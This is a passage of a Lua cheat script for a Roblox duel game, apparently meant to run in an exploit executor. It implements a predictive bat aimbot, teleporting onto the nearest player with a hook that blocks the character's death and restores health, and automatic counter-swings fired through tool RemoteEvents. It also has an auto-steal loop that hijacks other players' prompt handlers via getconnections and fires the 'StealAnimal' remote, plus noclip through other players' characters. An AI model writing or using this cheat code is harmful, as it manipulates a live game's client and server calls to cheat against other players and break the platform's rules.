                    quickChange = tick() - _bubbleBatAim.lastDirectionChangeTime < BUBBLE_BAT_AIM.DIRECTION_CHANGE_DETECTION_TIME
                    _bubbleBatAim.lastDirectionChangeTime = tick()
                end
                _bubbleBatAim.previousDirection = direction
            end

            local lead = _bubbleBatAim.currentPing + BUBBLE_BAT_AIM.SERVER_TICKRATE
            if quickChange then lead = lead * BUBBLE_BAT_AIM.QUICK_DIRECTION_CHANGE_MULTIPLIER end
            local acceleration = bubbleAverage(_bubbleBatAim.accelerationHistory)
            local predicted = targetPosition + velocity * lead
                + acceleration * BUBBLE_BAT_AIM.ACCELERATION_PREDICTION_WEIGHT * (lead * lead * 0.5)
            local predictionTime = BUBBLE_BAT_AIM.PREDICTION_TIME * 1.1
            if airborne then
                predicted = predicted + velocity * predictionTime
                    + Vector3.new(0, -0.5 * BUBBLE_BAT_AIM.GRAVITY * predictionTime * predictionTime, 0)
            else
                predicted = predicted + velocity * predictionTime
            end
            local flatVelocity = Vector3.new(velocity.X, 0, velocity.Z)
            local predictedTarget = flatVelocity.Magnitude > 1 and (predicted + flatVelocity.Unit * BUBBLE_BAT_AIM.PREDICT_AHEAD) or predicted
            local bubbleGoal = predictedTarget - root.Position

            -- Keep target-version approach offset and rotation, while using the source's prediction model.
            local legacyTarget = targetPosition + targetRoot.CFrame.LookVector * 0.3
            local legacyDirection = legacyTarget - root.Position
            local legacyFlat = Vector3.new(legacyDirection.X, 0, legacyDirection.Z)
            local legacyFlatUnit = legacyFlat.Magnitude > 0 and legacyFlat.Unit or Vector3.zero
            local legacyYVelocity = (targetPosition.Y + 3.7 - root.Position.Y) * 19.5 + velocity.Y * 0.8
            if humanoid.FloorMaterial ~= Enum.Material.Air then legacyYVelocity = math.max(legacyYVelocity, 13) end
            legacyYVelocity = math.clamp(legacyYVelocity, -70, 110)
            local speed = math.clamp(tonumber(AUTO_BAT_SPEED) or 58, 1, 120)
            local legacyVelocity = Vector3.new(legacyFlatUnit.X * speed, legacyYVelocity, legacyFlatUnit.Z * speed)
            local bubbleVelocity = bubbleGoal.Magnitude > BUBBLE_BAT_AIM.MIN_FOLLOW_DISTANCE
                and bubbleGoal.Unit * speed or Vector3.zero

            if bubbleGoal.Magnitude > 0.01 then
                local cross = root.CFrame.LookVector:Cross(bubbleGoal.Unit)
                local angle = math.asin(math.clamp(cross.Magnitude, -1, 1))
                root.AssemblyAngularVelocity = cross.Magnitude > 0.01 and cross.Unit * angle * 80 or Vector3.zero
            end
            if legacyDirection.Magnitude > 0.1 then
                local legacyGoalCF = CFrame.lookAt(root.Position, legacyTarget)
                local legacyDiffCF = root.CFrame:ToObjectSpace(legacyGoalCF)
                local rx, ry, rz = legacyDiffCF:ToOrientation()
                rx = math.clamp(rx, -2.5, 2.5)
                ry = math.clamp(ry, -2.5, 2.5)
                rz = math.clamp(rz, -2.5, 2.5)
                local legacyAngular = root.CFrame:VectorToWorldSpace(Vector3.new(rx * 42, ry * 42, rz * 42))
                root.AssemblyAngularVelocity = root.AssemblyAngularVelocity:Lerp(legacyAngular, 0.45)
            end

            if (targetPosition - root.Position).Magnitude <= BUBBLE_BAT_AIM.ACTIVATE_DISTANCE
                and tick() - _bubbleBatAim.lastActivationTime >= 0.3 then
                if bat then pcall(function() bat:Activate() end) end
                _bubbleBatAim.lastActivationTime = tick()
            end
            if bubbleGoal.Magnitude > BUBBLE_BAT_AIM.MIN_FOLLOW_DISTANCE then
                local hybridVelocity = bubbleVelocity:Lerp(legacyVelocity, 0.45)
                root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(hybridVelocity, 0.8)
            else
                root.AssemblyLinearVelocity = Vector3.new(0, root.AssemblyLinearVelocity.Y * 0.5, 0)
            end
        end)
        if not ok and tick() - _batAimLastWarn >= 3 then
            _batAimLastWarn = tick()
            warn("[HAVEN DUELS] Bat Aimbot frame error: " .. tostring(err))
        end
    end)
end

function stopBatAimbot()
    disableAutoBat()
end

local function disconnectTpBatAntiDie()
    for _, conn in ipairs(S.tpBatAntiDieConnections or {}) do pcall(function() conn:Disconnect() end) end
    S.tpBatAntiDieConnections = {}
end
local function hookTpBatAntiDie(character)
    disconnectTpBatAntiDie()
    if not S.tpBatEnabled or not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    pcall(function()
        humanoid.BreakJointsOnDeath = false
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dying, false)
    end)
    table.insert(S.tpBatAntiDieConnections, humanoid:GetPropertyChangedSignal("Health"):Connect(function()
        if S.tpBatEnabled and humanoid.Parent and humanoid.Health <= 0 then
            pcall(function() humanoid.Health = humanoid.MaxHealth; humanoid:ChangeState(Enum.HumanoidStateType.Running) end)
        end
    end))
end
local function findTpBatTool()
    local character=LP.Character
    if not character then return nil end
    local function matches(child)
        if not child:IsA("Tool") then return false end
        local name=child.Name:lower()
        return name:find("bat") or name:find("slap")
    end
    for _,child in ipairs(character:GetChildren()) do if matches(child) then return child end end
    local backpack=LP:FindFirstChildOfClass("Backpack")
    if backpack then
        for _,child in ipairs(backpack:GetChildren()) do
            if matches(child) then
                local humanoid=character:FindFirstChildOfClass("Humanoid")
                if humanoid then pcall(function() humanoid:EquipTool(child) end) end
                return child
            end
        end
    end
    return nil
end
local function findTpBatNearestTarget(root)
    if not root then return nil,math.huge end
    local best,bestDistance=nil,math.huge
    for _,player in ipairs(Players:GetPlayers()) do
        if player~=LP and player.Character then
            local otherRoot=player.Character:FindFirstChild("HumanoidRootPart")
            local otherHumanoid=player.Character:FindFirstChildOfClass("Humanoid")
            if otherRoot and otherHumanoid and otherHumanoid.Health>0 then
                local distance=(root.Position-otherRoot.Position).Magnitude
                if distance<bestDistance then bestDistance=distance; best=player end
            end
        end
    end
    return best,bestDistance
end
local function swingTpBat()
    if S.tpBatHitCooldown then return end
    S.tpBatHitCooldown=true
    pcall(function()
        local bat=findTpBatTool()
        if not bat then return end
        bat:Activate()
        local remote=bat:FindFirstChildWhichIsA("RemoteEvent")
        if remote then remote:FireServer() end
    end)
    task.delay(0.08,function() S.tpBatHitCooldown=false end)
end
local function tpBatTick()
    if not S.tpBatEnabled then return end
    local character=LP.Character
    if not character then return end
    local root=character:FindFirstChild("HumanoidRootPart")
    local humanoid=character:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health<=0 then return end
    local animator=humanoid:FindFirstChildOfClass("Animator")
    if animator then pcall(function() for _,track in ipairs(animator:GetPlayingAnimationTracks()) do track:Stop() end end) end
    local bat=findTpBatTool()
    if bat and bat.Parent~=character then pcall(function() humanoid:EquipTool(bat) end) end
    local target,distance=findTpBatNearestTarget(root)
    if not target or distance>100 then return end
    local targetRoot=target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if not targetRoot then return end
    pcall(function() if root.SetNetworkOwner then root:SetNetworkOwner(nil) end end)
    if not S.tpBatEnabled or root.Parent~=character or not targetRoot.Parent then return end
    root.CFrame=CFrame.new(targetRoot.Position+Vector3.new(0,0.9,0))
    root.AssemblyLinearVelocity=targetRoot.AssemblyLinearVelocity
    pcall(function() if root.SetNetworkOwner then root:SetNetworkOwner(LP) end end)
    local currentCamera=workspace.CurrentCamera
    if currentCamera then currentCamera.CFrame=CFrame.new(currentCamera.CFrame.Position,targetRoot.Position) end
    swingTpBat()
    pcall(function() for _,descendant in ipairs(character:GetDescendants()) do if descendant:IsA("BasePart") then descendant.CanCollide=false end end end)
end
local function setTpBat(state)
    local enabled=state==true
    S.tpBatEnabled=enabled; S.batTpEnabled=enabled; S._smartBatTpDriving=enabled
    if enabled then
        hookTpBatAntiDie(LP.Character)
        if S.tpBatConn then S.tpBatConn:Disconnect() end
        S.tpBatConn=RunService.Heartbeat:Connect(tpBatTick)
    else
        if S.tpBatConn then S.tpBatConn:Disconnect(); S.tpBatConn=nil end
        disconnectTpBatAntiDie()
        local character=LP.Character
        local root=character and character:FindFirstChild("HumanoidRootPart")
        if root then pcall(function() if root.SetNetworkOwner then root:SetNetworkOwner(LP) end end) end
    end
end
LP.CharacterAdded:Connect(function(character)
    if S.tpBatEnabled then task.wait(0.1); hookTpBatAntiDie(character) end
end)
setBatAimbot = function(state)
    if S.batAimbotEnabled == state then return end
    S.batAimbotEnabled = state
    if state then
        startBatAimbot()
    else
        stopBatAimbot()
    end
    if S.batAimbotSetVisual then S.batAimbotSetVisual(state) end
    if S._setPButtonActive and S._btnBAT then
        S._setPButtonActive(S._btnBAT, S._bsBAT, S._l1BAT, S._l2BAT, state)
    end
    S.restartMovement()
    saveConfig()
end

BAT_COUNTER_SLAP_LIST = {
    "Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap",
    "Emerald Slap", "Ruby Slap", "Dark Matter Slap", "Flame Slap",
    "Nuclear Slap", "Galaxy Slap", "Glitched Slap",
}

local function findBatForCounter()
    local character = LP.Character
    if not character then return nil end
    local backpack = LP:FindFirstChildOfClass("Backpack")
    for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
        local tool = character:FindFirstChild(name) or (backpack and backpack:FindFirstChild(name))
        if tool then return tool end
    end
    for _, child in ipairs(character:GetChildren()) do
        if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
            return child
        end
    end
    if backpack then
        for _, child in ipairs(backpack:GetChildren()) do
            if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
                return child
            end
        end
    end
    return nil
end

local function swingBatForCounter(bat, character)
    if not bat or not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if bat.Parent ~= character and humanoid then
        pcall(function() humanoid:EquipTool(bat) end)
        task.wait(0.05)
    end
    local remote = bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
    if remote and remote:IsA("RemoteEvent") then
        pcall(function() remote:FireServer() end)
        task.wait(0.1)
        pcall(function() remote:FireServer() end)
    else
        pcall(function() bat:Activate() end)
        task.wait(0.1)
        pcall(function() bat:Activate() end)
    end
end

triggerBatCounter = function(character)
    if not S.batCounterEnabled or S.batCounterDebounce then return end
    character = character or LP.Character
    if not character then return end
    S.batCounterDebounce = true
    -- Clean integra estos hooks con body-lock; se usan solo si están disponibles.
    if type(_suppressBodyLock) == "function" then pcall(_suppressBodyLock) end
    task.spawn(function()
        task.wait(0.15)
        local ok, err = pcall(function()
            local bat = findBatForCounter()
            if bat then swingBatForCounter(bat, character) end
        end)
        if not ok then warn("[Vision] Bat Counter error: " .. tostring(err)) end
        task.wait(0.3)
        S.batCounterDebounce = false
        if type(_unsuppressBodyLock) == "function" then pcall(_unsuppressBodyLock, true) end
    end)
end

stopBatCounter = function()
    if S.batCounterConn then
        S.batCounterConn:Disconnect()
        S.batCounterConn = nil
    end
    S.batCounterDebounce = false
end

startBatCounter = function()
    if S.batCounterConn then return end
    S.batCounterConn = RunService.Heartbeat:Connect(function()
        if not S.batCounterEnabled or S.batCounterDebounce then return end
        local character = LP.Character
        if not character then return end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
        local state = humanoid:GetState()
        if state == Enum.HumanoidStateType.Physics
            or state == Enum.HumanoidStateType.Ragdoll
            or state == Enum.HumanoidStateType.FallingDown then
            triggerBatCounter(character)
        end
    end)
end
medusaWatchedCharacter = nil
medusaLastErrorWarn = 0

local function findMedusa(character)
    local c = character or LP.Character
    if not c then return nil end
    local function isMedusaTool(tool)
        if not tool or not tool:IsA("Tool") then return false end
        local name = tool.Name:lower()
        return name:find("medusa") or name:find("head") or name:find("stone")
    end
    for _, tool in ipairs(c:GetChildren()) do
        if isMedusaTool(tool) then return tool end
    end
    local backpack = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do
            if isMedusaTool(tool) then return tool end
        end
    end
    return nil
end

local function useMedusaCounter()
    if not S.medusaCounterEnabled or S.medusaDebounce then return end
    local now = tick()
    if now - (S.medusaLastUsed or 0) < S.MEDUSA_COOLDOWN then return end
    local character = LP.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not character or not humanoid or humanoid.Health <= 0 then return end

    S.medusaDebounce = true
    local ok, activated = pcall(function()
        local medusa = findMedusa(character)
        if not medusa then return false end
        if medusa.Parent ~= character then
            local equipOk = pcall(function() humanoid:EquipTool(medusa) end)
            if not equipOk then return false end
        end
        if not medusa.Parent then return false end
        local activateOk = pcall(function() medusa:Activate() end)
        if not activateOk then return false end
        return true
    end)
    S.medusaDebounce = false
    if ok and activated then
        S.medusaLastUsed = tick()
    elseif not ok and tick() - medusaLastErrorWarn >= 3 then
        medusaLastErrorWarn = tick()
        warn("[Vision] Medusa Counter error: " .. tostring(activated))
    end
end

local function onAnchorChanged(part)
    if not part or not part:IsA("BasePart") then return nil end
    return part:GetPropertyChangedSignal("Anchored"):Connect(function()
        if not S.medusaCounterEnabled or not part.Parent then return end
        if part.Anchored and part.Transparency == 1 then
            useMedusaCounter()
        end
    end)
end

local function stopMedusaCounter()
    for _, connection in ipairs(S.medusaConns) do
        if connection then pcall(function() connection:Disconnect() end) end
    end
    S.medusaConns = {}
    medusaWatchedCharacter = nil
end

local function setupMedusaCounter(character)
    stopMedusaCounter()
    if not character or not S.medusaCounterEnabled or character ~= LP.Character then return end
    medusaWatchedCharacter = character
    local watchedParts = {}
    local function watchPart(part)
        if not S.medusaCounterEnabled or medusaWatchedCharacter ~= character then return end
        if not part or not part:IsA("BasePart") or watchedParts[part] then return end
        watchedParts[part] = true
        local ok, connection = pcall(onAnchorChanged, part)
        if ok and connection then table.insert(S.medusaConns, connection) end
    end
    for _, part in ipairs(character:GetDescendants()) do
        watchPart(part)
    end
    table.insert(S.medusaConns, character.DescendantAdded:Connect(watchPart))
end

LP.CharacterRemoving:Connect(function(character)
    if medusaWatchedCharacter == character then stopMedusaCounter() end
end)

local function applyFPSBoost()
    safeSetfpscap(999999999)
    removeCharacterAccessories()
    local function pO(v)
        pcall(function()
            if v:IsA("Model") then
                v.LevelOfDetail = Enum.ModelLevelOfDetail.Disabled
                v.ModelStreamingMode = Enum.ModelStreamingMode.Nonatomic
            elseif v:IsA("MeshPart") then
                v.CastShadow = false; v.DoubleSided = false
                v.RenderFidelity = Enum.RenderFidelity.Performance
            elseif v:IsA("BasePart") then
                v.CastShadow = false; v.Material = Enum.Material.Plastic; v.Reflectance = 0
            elseif v:IsA("Decal") or v:IsA("Texture") then
                v.Transparency = 1
            elseif v:IsA("SpecialMesh") then
                v.TextureId = ""
            elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke")
                or v:IsA("Sparkles") or v:IsA("ParticleEmitter")
                or v:IsA("Trail") or v:IsA("Beam") then
                v.Enabled = false
            elseif v:IsA("SurfaceAppearance") or v:IsA("MaterialVariant") then
                v:Destroy()
            elseif v:IsA("Attachment") then
                v.Visible = false
            end
        end)
    end
    for _, v in pairs(workspace:GetDescendants()) do pO(v) end
    pcall(function()
        local L = Lighting
        for _, v in pairs(L:GetDescendants()) do
            pcall(function()
                if v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("BloomEffect")
                    or v:IsA("BlurEffect") or v:IsA("SunRaysEffect")
                    or v:IsA("DepthOfFieldEffect") or v:IsA("Clouds")
                    or v:IsA("PostEffect") or v:IsA("ColorCorrectionEffect") then
                    v:Destroy()
                end
            end)
        end
        safeSethiddenproperty(L, "Technology", Enum.Technology.Legacy)
        L.GlobalShadows = false; L.FogEnd = 9e9; L.Brightness = 0
        local ter = workspace:FindFirstChildOfClass("Terrain")
        if ter then
            safeSethiddenproperty(ter, "Decoration", false)
            ter.WaterReflectance = 0; ter.WaterTransparency = 0.7
            ter.WaterWaveSize = 0; ter.WaterWaveSpeed = 0
        end
    end)
    workspace.DescendantAdded:Connect(function(v)
        if S.fpsBoostEnabled then task.spawn(pO, v) end
    end)
end

local function stopFPSBoost()
    S.fpsBoostEnabled = false
    restoreAccessories()
end

local function runTPFloor()
    pcall(function() executeTPDown() end)
end

getconnections = getconnections or get_signal_cons or getconnects or (syn and syn.get_signal_cons)

local function isMyPlotByName(plotName)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local plot = plots:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yb = sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") then
            return yb.Enabled == true
        end
    end
    return false
end

local function sanitizeStealRadius(value, fallback)
    local raw = tostring(value or ""):gsub(",", ".")
    local n = tonumber(raw)
    if not n or n ~= n or n <= 0 or n == math.huge or n == -math.huge then
        return fallback or 61
    end
    return n
end

local function setStealRadius(value, fallback)
    S.Steal.StealRadius = sanitizeStealRadius(value, fallback or S.Steal.StealRadius)
    return S.Steal.StealRadius
end
local function sanitizeStealDuration(value, fallback)
    local raw = tostring(value or ""):gsub(",", ".")
    local number = tonumber(raw)
    if not number or number ~= number or number == math.huge or number == -math.huge then
        return fallback or 1.3
    end
    return math.clamp(number, 0.05, 2)
end
local function setStealDuration(value, fallback)
    S.Steal.StealDuration = sanitizeStealDuration(value, fallback or S.Steal.StealDuration)
    return S.Steal.StealDuration
end

autoGrabSetDelayRadius = 9
autoGrabStopTime = 0.96
autoGrabStopEnabled = true
_plotsCache = nil
_plotsCacheTime = 0

local function getPlotsRoot()
    local now = tick()
    if _plotsCache and now - _plotsCacheTime < 2 and _plotsCache.Parent then
        return _plotsCache
    end
    _plotsCache = workspace:FindFirstChild("Plots")
    _plotsCacheTime = now
    return _plotsCache
end

local function applyStealRadiusToPrompt(prompt)
    if not prompt then return end
    pcall(function()
        prompt.MaxActivationDistance = math.max(prompt.MaxActivationDistance or 0, setStealRadius(S.Steal.StealRadius, 61))
    end)
end

local function findNearestPrompt()
    local char = LP.Character
    if not char then return nil, nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil, nil end
    local plotsRoot = getPlotsRoot()
    if not plotsRoot then return nil, nil end

    local nearestPrompt, nearestDist, nearestName = nil, math.huge, nil
    local rpos = root.Position
    local radius = setStealRadius(S.Steal.StealRadius, 61)
    for _, plot in ipairs(plotsRoot:GetChildren()) do
        if isMyPlotByName(plot.Name) then continue end
        local pods = plot:FindFirstChild("AnimalPodiums")
        if not pods then continue end
        for _, pod in ipairs(pods:GetChildren()) do
            pcall(function()
                local base = pod:FindFirstChild("Base")
                local spawn = base and base:FindFirstChild("Spawn")
                if spawn then
                    local sp = spawn.Position
                    local dx, dy, dz = sp.X - rpos.X, sp.Y - rpos.Y, sp.Z - rpos.Z
                    local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
                    if dist < nearestDist and dist <= radius then
                        local att = spawn:FindFirstChild("PromptAttachment")
                        if att then
                            for _, child in ipairs(att:GetChildren()) do
                                if child:IsA("ProximityPrompt") and tostring(child.ActionText or ""):find("Steal") then
                                    applyStealRadiusToPrompt(child)
                                    nearestPrompt, nearestDist, nearestName = child, dist, pod.Name
                                    break
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
    return nearestPrompt, nearestName
end

local function resetCleanStealProgress()
    if S.progressFill then S.progressFill.Size = UDim2.new(0, 0, 1, 0) end
    if S.progressPct then S.progressPct.Text = "0%" end
end

local function autoCarryStart()
    if not S.autoCarryEnabled or S.autoCarryActive then return end
    S.autoCarryPending = false
    S.autoCarryWasSpeedMode = S.speedMode
    S.autoCarryActive = true

    if S.laggerMode ~= 0 then
        S.laggerMode = 0
        if S.setLaggerVisual then S.setLaggerVisual(false) end
    end

    pcall(function() S.setCarrySpeedMode() end)
    pcall(function() S.restartMovement() end)
    pcall(function() updateFloatingButtons() end)
    if S.autoCarrySetVisual then pcall(function() S.autoCarrySetVisual(true) end) end
end

local function autoCarryStop()
    if not S.autoCarryActive then
        S.autoCarryPending = false
        S.autoCarryStealingBefore = false
        S.autoCarryChildSnapshot = nil
        return
    end

    S.autoCarryActive = false
    S.autoCarryPending = false
    S.autoCarryStealingBefore = false
    S.autoCarryChildSnapshot = nil

    pcall(function()
        if S.autoCarryWasSpeedMode then
            S.setCarrySpeedMode()
        else
            S.setNormalSpeedMode()
        end
        S.restartMovement()
        updateFloatingButtons()
        if S.autoCarrySetVisual then S.autoCarrySetVisual(false) end
    end)
end

local function startAutoCarryWatcher()
    if S.autoCarryWatchConn then return end

    S.autoCarryWatchConn = RunService.Heartbeat:Connect(function()
        if not S.autoCarryEnabled then
            if S.autoCarryActive then autoCarryStop() end
            S.autoCarryPending = false
            S.autoCarryStealingBefore = false
            S.autoCarryChildSnapshot = nil
            return
        end

        local character = LP.Character
        local carrying = character and tpIsCarryingBrainrot(character) or false

        -- El cambio ocurre solamente cuando el personaje ya está cargando el Brainrot.
        if S.autoCarryPending and carrying then
            autoCarryStart()
            return
        end

        -- Cuando deja de cargarlo, vuelve al modo anterior.
        if S.autoCarryActive and not carrying then
            autoCarryStop()
        end
    end)
end

startAutoCarryWatcher()

local function executeSteal(prompt, podName)
    if S.Steal.isStealing or not prompt then return end

    if math.random(30) == 1 then
        for cachedPrompt in pairs(S.Steal.Data) do
            if not cachedPrompt.Parent then S.Steal.Data[cachedPrompt] = nil end
        end
    end

    if not S.Steal.Data[prompt] then
        S.Steal.Data[prompt] = {hold = {}, trigger = {}, ready = true}
        pcall(function()
            if getconnections then
                for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
                    if c.Function then table.insert(S.Steal.Data[prompt].hold, c.Function) end
                end
                for _, c in ipairs(getconnections(prompt.Triggered)) do
                    if c.Function then table.insert(S.Steal.Data[prompt].trigger, c.Function) end
                end
            end
        end)
    end

    local data = S.Steal.Data[prompt]
    if not data.ready then return end
    data.ready = false
    S.Steal.isStealing = true
    S.Steal.stealStartTime = tick()

    resetCleanStealProgress()

    task.spawn(function()
        for _, fn in ipairs(data.hold) do task.spawn(fn) end

        local startTime = tick()
        local duration = setStealDuration(S.Steal.StealDuration, 1.3)
        local promptFired = false
        local stopProgress = 0

        if autoGrabStopEnabled then
            while S.Steal.isStealing and S.Steal.AutoStealEnabled do
                local elapsed = tick() - startTime
                if elapsed >= autoGrabStopTime then break end
                local progress = math.clamp(elapsed / duration, 0, 1)
                if S.progressFill then S.progressFill.Size = UDim2.new(progress, 0, 1, 0) end
                if S.progressPct then S.progressPct.Text = math.floor(progress * 100) .. "%" end
                if not prompt.Parent or not prompt.Parent.Parent then break end
                local char = LP.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp and (hrp.Position - prompt.Parent.Parent.Position).Magnitude > S.Steal.StealRadius then break end
                task.wait()
            end

            stopProgress = math.clamp(autoGrabStopTime / duration, 0, 1)
            if S.progressFill then S.progressFill.Size = UDim2.new(stopProgress, 0, 1, 0) end
            if S.progressPct then S.progressPct.Text = math.floor(stopProgress * 100) .. "%" end

            local phase2Timeout = math.max(2.99 - autoGrabStopTime - math.max(duration - autoGrabStopTime, 0), 0.05)
            local phase2Start = tick()
            while S.Steal.isStealing and S.Steal.AutoStealEnabled do
                if tick() - phase2Start >= phase2Timeout then
                    resetCleanStealProgress()
                    data.ready = true
                    S.Steal.isStealing = false
                    task.wait()
                    local newPrompt, newName = findNearestPrompt()
                    if newPrompt then executeSteal(newPrompt, newName) end
                    return
                end
                if not prompt.Parent or not prompt.Parent.Parent then
                    resetCleanStealProgress()
                    data.ready = true
                    S.Steal.isStealing = false
                    return
                end
                local char = LP.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local dist = (hrp.Position - prompt.Parent.Parent.Position).Magnitude
                    if dist <= autoGrabSetDelayRadius then
                        break
                    elseif dist > S.Steal.StealRadius then
                        resetCleanStealProgress()
                        data.ready = true
                        S.Steal.isStealing = false
                        return
                    end
                end
                task.wait()
            end

            if S.Steal.isStealing and S.Steal.AutoStealEnabled then
                local fillStart = tick()
                local fillDuration = math.max(duration - autoGrabStopTime, 0.05)
                while true do
                    local fp = math.clamp((tick() - fillStart) / fillDuration, 0, 1)
                    local totalProgress = stopProgress + fp * (1 - stopProgress)
                    if S.progressFill then S.progressFill.Size = UDim2.new(totalProgress, 0, 1, 0) end
                    if S.progressPct then S.progressPct.Text = math.floor(totalProgress * 100) .. "%" end
                    if fp >= 1 and not promptFired then
                        promptFired = true
                        pcall(function()
                            for _, fn in ipairs(data.trigger) do task.spawn(fn) end
                            -- Guardar el estado ANTES del remote: así no confundimos
                            -- el estado de "estoy intentando robar" con el de "ya lo cargué".
                            if S.autoCarryEnabled then
                                local ch = LP.Character
                                S.autoCarryStealingBefore = (LP:GetAttribute("Stealing") == true)
                                    or (ch and ch:GetAttribute("Stealing") == true)
                                S.autoCarryChildSnapshot = {}
                                if ch then
                                    for _, child in ipairs(ch:GetChildren()) do
                                        S.autoCarryChildSnapshot[child] = true
                                    end
                                end
                                S.autoCarryPending = true
                            end
                            local remote = ReplicatedStorage:FindFirstChild("StealAnimal")
                            if remote and podName then remote:FireServer(podName) end
                            if prompt then prompt:Fire() end
                        end)
                        break
                    end
                    task.wait()
                end
            end
        else
            while S.Steal.isStealing and S.Steal.AutoStealEnabled do
                local elapsed = tick() - startTime
                local progress = math.clamp(elapsed / duration, 0, 1)
                if S.progressFill then S.progressFill.Size = UDim2.new(progress, 0, 1, 0) end
                if S.progressPct then S.progressPct.Text = math.floor(progress * 100) .. "%" end
                if not prompt.Parent or not prompt.Parent.Parent then break end
                local char = LP.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp and (hrp.Position - prompt.Parent.Parent.Position).Magnitude > S.Steal.StealRadius then break end
                if elapsed >= duration and not promptFired then
                    promptFired = true
                    pcall(function()
                        for _, fn in ipairs(data.trigger) do task.spawn(fn) end
                        -- Guardar el estado ANTES del remote.
                        if S.autoCarryEnabled then
                            local ch = LP.Character
                            S.autoCarryStealingBefore = (LP:GetAttribute("Stealing") == true)
                                or (ch and ch:GetAttribute("Stealing") == true)
                            S.autoCarryChildSnapshot = {}
                            if ch then
                                for _, child in ipairs(ch:GetChildren()) do
                                    S.autoCarryChildSnapshot[child] = true
                                end
                            end
                            S.autoCarryPending = true
                        end
                        local remote = ReplicatedStorage:FindFirstChild("StealAnimal")
                        if remote and podName then remote:FireServer(podName) end
                        if prompt then prompt:Fire() end
                    end)
                    break
                end
                task.wait()
            end
        end

        resetCleanStealProgress()
        data.ready = true
        S.Steal.isStealing = false

    end)
end

local function startAutoSteal()
    if S.Conns.autoSteal then
        S.stealActive = true
        S.Steal.AutoStealEnabled = true
        return
    end
    S.stealActive = true
    S.Steal.AutoStealEnabled = true
    S.Conns.autoSteal = RunService.Heartbeat:Connect(function()
        if not S.Steal.AutoStealEnabled or S.Steal.isStealing then return end
        local prompt, podName = findNearestPrompt()
        if prompt then executeSteal(prompt, podName) end
    end)
end

local function stopAutoSteal()
    if S.Conns.autoSteal then S.Conns.autoSteal:Disconnect(); S.Conns.autoSteal = nil end
    S.stealActive = false
    S.Steal.AutoStealEnabled = false
    if S.Conns.progress then S.Conns.progress:Disconnect(); S.Conns.progress = nil end
    S.Steal.isStealing = false
    S.Steal.stealStartTime = nil
    resetCleanStealProgress()
end

_noclipCache = {}  -- [player] = {char, parts[]}
RunService.Stepped:Connect(function(_, dt)
    S._noclipTimer = S._noclipTimer + dt
    if S._noclipTimer < 0.15 then return end  -- 6fps es suficiente para noclip
    S._noclipTimer = 0
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local cached = _noclipCache[p]
            if not cached or cached.char ~= p.Character then
                local parts = {}
                for _, obj in ipairs(p.Character:GetDescendants()) do
                    if obj:IsA("BasePart") then table.insert(parts, obj) end
                end
                _noclipCache[p] = {char = p.Character, parts = parts}
                cached = _noclipCache[p]
            end
            for _, part in ipairs(cached.parts) do
                if part and part.Parent then part.CanCollide = false end
            end
        else
            _noclipCache[p] = nil
        end
    end
end)

RunService.RenderStepped:Connect(function()
    S._fpsCount = S._fpsCount + 1
    local now = tick()
    if now - S._lastFpsTime >= 1 then
        S.currentFPS = math.floor(S._fpsCount/(now - S._lastFpsTime))
        S._fpsCount = 0
        S._lastFpsTime = now
    end
end)

updateFloatingButtons = function()
    if not S._setPButtonActive then return end
    local fb = S._floatingButtons
    if fb.lagger then updateLaggerButtonVisual() end
    if fb.carry then S._setPButtonActive(fb.carry, fb.strokeCarry, fb.l1Carry, fb.l2Carry, S.speedMode) end
    if fb.autoLeft then S._setPButtonActive(fb.autoLeft, fb.strokeAutoLeft, fb.l1AutoLeft, fb.l2AutoLeft, S.autoLeftEnabled) end
    if fb.autoRight then S._setPButtonActive(fb.autoRight, fb.strokeAutoRight, fb.l1AutoRight, fb.l2AutoRight, S.autoRightEnabled) end
    if fb.bat then S._setPButtonActive(fb.bat, fb.strokeBat, fb.l1Bat, fb.l2Bat, S.batAimbotEnabled) end
end

local function setUILock(enabled)
    S.lockUIEnabled = enabled == true
    if S.lockUIEnabled then S._floatingPanelDragging = false end
    -- Lock bloquea únicamente el arrastre; las acciones siguen funcionando.
    if S.mainMenuFrame then S.mainMenuFrame.Active = true end
    if S.miniToggleButton then S.miniToggleButton.Active = true end
    -- El contenedor es solo visual; nunca debe capturar toques detrás.
    if S.floatingPanelFrame then S.floatingPanelFrame.Active = false end
end

local function makeDraggable(frame, isFloatingPanel, dragTarget, onMove)
    local dragging, dragStart, startPos = false, nil, nil
    local moved = false
    local target = dragTarget or frame
    frame.Active = true
    frame.InputBegan:Connect(function(inp)
        if S.lockUIEnabled then return end
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            moved = false
